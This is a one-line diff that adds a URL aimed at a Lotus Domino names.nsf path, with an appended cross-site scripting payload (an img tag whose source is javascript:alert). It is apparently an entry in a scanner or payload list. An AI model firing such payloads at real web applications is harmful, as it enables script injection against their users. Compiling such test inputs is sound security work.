@@ -1,0 +1,1 @@
+http://www.example.com/names.nsf/<img src="javascript:alert(31337)">
